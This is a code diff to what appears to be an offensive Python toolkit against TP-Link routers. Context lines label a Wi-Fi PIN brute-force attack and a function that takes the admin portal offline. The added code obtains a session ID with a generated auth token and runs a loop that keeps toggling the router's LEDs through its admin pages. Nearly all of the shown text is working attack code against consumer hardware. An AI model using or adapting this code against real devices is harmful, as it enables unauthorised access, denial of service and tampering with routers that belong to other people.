@@ -4,8 +4,11 @@ import hashlib
 import base64 
 import urllib.parse
 import requests
+import re
+import threading
 from pwn import *
 
+keep_running = True
 #Attack 1 - SSID PIN Brute Force
 def ssid_authentication(ssid: str, pin: str) -> bool:
     subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -162,3 +165,76 @@ def dos_admin_portal(target_url: str):
     sh1.interactive()
     '''
     print(f"[+] The Admin Portal has been successfully taken down!")
+
+
+def get_sessionID(target_url: str , token: str)-> str:
+    if not target_url.endswith("/"):
+        target_url += "/"
+    session_cookie = {"Authorization": token}
+    headers = {
+        "Referer": target_url,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    }
+
+    try:
+
+        response = requests.get(target_url + "userRpm/LoginRpm.htm?Save=Save",cookies=session_cookie,headers=headers,)
+
+        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
+            match = re.search(r"/([A-Z0-9]{16})/userRpm", response.text)
+
+            if match:
+                return match.group(1) 
+            else:
+                print("[!] Login succeeded, but Session ID pattern not found.")
+                return None
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Connection error: {e}")
+
+    return None
+
+def listen_for_stop():
+    global keep_running
+    while keep_running:
+        user_input = input().strip().lower()
+        if user_input == "s":
+            print("\n[*] Stopping the lightshow :(")
+            keep_running = False
+            break
+
+def lightshow(target_url: str, password: str):
+    global keep_running
+    token = generate_tp_link_auth_token(password)
+    session_id = get_sessionID(target_url, token)
+    keep_running = True
+    stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
+    stop_thread.start()
+    print("[*] Lightshow starting now. Press 's' to stop.")
+    session_cookie = {"Authorization": token}
+    round = 0
+    while keep_running:
+        if round % 2 ==0:
+            change_filter= "Disfilter"
+            ref_filter = "Enfilter"
+            print(f"[-] Turning off")
+        else:
+            change_filter= "Enfilter"
+            ref_filter = "Disfilter"
+            print(f"[+] Turning on")
+        referer = f"{target_url}{session_id}/userRpm/LedCtrlRpm.htm?{change_filter}=1"
+        headers = {
+            "Referer": referer,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        }
+        try:
+            response = requests.get(target_url+session_id+"/userRpm/LedCtrlRpm.htm?"+ref_filter+"=1",cookies=session_cookie,headers=headers)
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Connection error: {e}")
+        round+=1
+
+        for _ in range(5):
+            if not keep_running:
+                break
+            time.sleep(0.1)
+
+
